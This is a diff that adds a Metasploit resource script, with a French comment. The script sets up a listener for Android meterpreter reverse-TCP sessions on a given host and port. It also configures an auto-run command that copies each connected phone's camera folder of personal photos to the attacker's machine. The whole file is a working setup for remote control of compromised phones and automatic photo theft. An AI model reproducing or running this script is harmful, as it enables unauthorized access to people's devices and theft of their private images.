@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 10.172.28.14
+set LPORT 5566
+set ExitOnSession false
+# Commande magique : exécute le téléchargement dès que la session s'ouvre
+set AutoRunScript "download /sdcard/DCIM/Camera/ ./mes_photos_recuperees/"
+exploit -j -z
